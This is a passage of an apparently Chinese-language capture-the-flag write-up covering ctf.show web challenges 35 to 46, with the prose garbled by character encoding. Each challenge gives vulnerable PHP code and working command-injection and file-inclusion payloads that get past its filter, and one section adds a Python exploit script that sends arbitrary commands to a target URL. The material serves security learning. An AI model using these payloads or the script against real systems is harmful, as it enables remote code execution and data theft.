highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯” web34 å¤šè¿‡æ»¤äº†**<code>&lt; å’Œ =</code>**ï¼Œpayload å’Œä¸Šä¸€é¢˜ä¸€æ ·</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-36"><a href="#Web-36" class="headerlink" title="Web 36"></a>Web 36</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 04:21:16<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯” Web35 å¤šè¿‡æ»¤äº† <code>/</code> å’Œ <code>[0-9]</code>ï¼Œæ•°å­—è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¢æˆå­—æ¯</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=include$_GET[b]?&gt;&amp;b=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-37"><a href="#Web-37" class="headerlink" title="Web 37"></a>Web 37</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 05:18:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>//flag in flag.php<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        include($c);<br>        echo $flag;<br>    <br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>eval()</code> å‡½æ•°å˜æˆ <code>include()</code> äº†,è¯´æ˜ä¸èƒ½åŒ…å« flag ï¼Œè¯•è¯•ç”¨ php ä¼ªåè®®ï¼Œdata:&#x2F;&#x2F;</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==<br>//&lt;?php system(&quot;tac flag.php&quot;);?&gt;<br></code></pre></td></tr></table></figure><h1 id="Web-38"><a href="#Web-38" class="headerlink" title="Web 38"></a>Web 38</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 05:23:36<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>//flag in flag.php<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;<br>        include($c);<br>        echo $flag;<br>    <br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº†ä¸€ä¸ª <code>php</code> å’Œ <code>file</code>ï¼Œå¯¹ payload æ²¡ä»€ä¹ˆå½±å“</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==<br></code></pre></td></tr></table></figure><h1 id="Web-39"><a href="#Web-39" class="headerlink" title="Web 39"></a>Web 39</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 06:13:21<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>//flag in flag.php<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        include($c.&quot;.php&quot;);<br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¼ºåˆ¶åŠ äº†åç¼€ï¼Œ<code>include</code> å‡½æ•°ä¸­ <code>$c</code> ååŠ äº†<code>.php</code> åç¼€ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´åœ¨ä¼ å…¥çš„å‚æ•°åé¢ä¼šè‡ªåŠ¨åŠ ä¸Š <code>php</code> åç¼€ï¼Œpayload å¯ä»¥ä¸º</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=data://text/plain,&lt;?php system(&quot;tac fla*.php&quot;);?&gt;<br></code></pre></td></tr></table></figure><h1 id="Web-40"><a href="#Web-40" class="headerlink" title="Web 40*"></a>Web 40*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 06:03:36<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œåªæœ‰ç©ºæ ¼ï¼Œåˆ†å·ï¼Œæ‹¬å·è¿˜å¯ä»¥ç”¨ï¼Œå­—æ¯å‚æ•°å·²ç»è¿‡æ»¤å®Œäº†ï¼ŒæŸ¥çœ‹ hint</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>()))))); <span class="hljs-variable">GXYCTF</span>çš„ç¦æ­¢å¥—å¨ƒ é€šè¿‡<span class="hljs-variable">cookie</span>è·å¾—å‚æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span><br><span class="hljs-function"><span class="hljs-variable">c</span>=<span class="hljs-title">session_start</span>();<span class="hljs-title">system</span>(<span class="hljs-title">session_id</span>());</span><br><span class="hljs-function"><span class="hljs-variable">passid</span>=<span class="hljs-variable">ls</span></span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ hint çš„æ–¹æ³•</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><h1 id="Web-41"><a href="#Web-41" class="headerlink" title="Web 41"></a>Web 41</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: ç¾½<br># @Date:   2020-09-05 20:31:22<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:40:07<br># @email: 1341963450@qq.com<br># @link: https://ctf.show<br><br>*/<br><br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>    $c = $_POST[&#x27;c&#x27;];<br>if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))&#123;<br>        eval(&quot;echo($c);&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>åªå‰©ä¸‹äº† <code>|</code> ï¼Œçœ‹çš„å¸ˆå‚…åšå®¢ï¼Œ<a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><p>rce_or.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;rce_or.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;<span class="hljs-comment">//æ›¿æ¢æˆé¢˜ç›®çš„æ­£åˆ™</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br></code></pre></td></tr></table></figure><p>ä»è¿›è¡Œå¼‚æˆ–çš„å­—ç¬¦ä¸­æ’é™¤æ‰è¢«è¿‡æ»¤çš„ï¼Œç„¶ååœ¨åˆ¤æ–­å¼‚æˆ–å¾—åˆ°çš„å­—ç¬¦æ˜¯å¦ä¸ºå¯è§å­—ç¬¦</p><p>poc.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;php rce_or.php&quot;</span>)  <span class="hljs-comment">#æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(argv)!=<span class="hljs-number">2</span>):<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;USERï¼špython exp.py &lt;url&gt;&#x27;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;egï¼š  python exp.py http://ctf.show/&quot;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   exit(<span class="hljs-number">0</span>)<br>url=argv[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rce_or.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your commandï¼š&quot;</span>))<br>   data=&#123;<br>       <span class="hljs-string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)<br>       &#125;<br>   r=requests.post(url,data=data)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] result:\n&quot;</span>+r.text)<br><br></code></pre></td></tr></table></figure><p>ç”¨æ³•å°±æ˜¯</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> poc.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;url&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ab36673e8f412f92.png"></p><p>url ç”¨ <code>https</code> ä¼šæŠ¥é”™ï¼Œæ”¹æˆ <code>http</code> å°±å¥½äº†</p><h1 id="Web-42"><a href="#Web-42" class="headerlink" title="Web 42"></a>Web 42</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 20:51:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&gt;/dev/null 2&gt;&amp;1</code> å°†è¾“å…¥é‡å®šå‘åˆ° <code>/dev/null</code> ä¸­ï¼Œå¯ä»¥ç›´æ¥æ³¨é‡Šæ‰ï¼Œæ¯”å¦‚è¯´ <code>%0a</code> æˆªæ–­ï¼Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=cat flag.php%0a<br></code></pre></td></tr></table></figure><p>å†æŸ¥çœ‹æºä»£ç </p><h1 id="Web-43"><a href="#Web-43" class="headerlink" title="Web 43"></a>Web 43</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:32:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯æˆªæ–­ï¼Œ<code>cat</code> è¢«ç¦äº†å°±ç”¨ <code>tac/tail/rev</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac fla*%0a<br></code></pre></td></tr></table></figure><h1 id="Web-44"><a href="#Web-44" class="headerlink" title="Web 44"></a>Web 44</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:32:01<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€æ ·çš„ payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac fla*%0a<br></code></pre></td></tr></table></figure><h1 id="Web-45"><a href="#Web-45" class="headerlink" title="Web 45"></a>Web 45</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:35:34<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº†ä¸ªç©ºæ ¼ï¼Œç”¨ <code>%90/$&#123;IFS&#125;</code> ä»£æ›¿</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09fla*%0a<br>?c=tac$&#123;IFS&#125;fla*%0a<br></code></pre></td></tr></table></figure><h1 id="Web-46"><a href="#Web-46" class="headerlink" title="Web 46"></a>Web 46</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 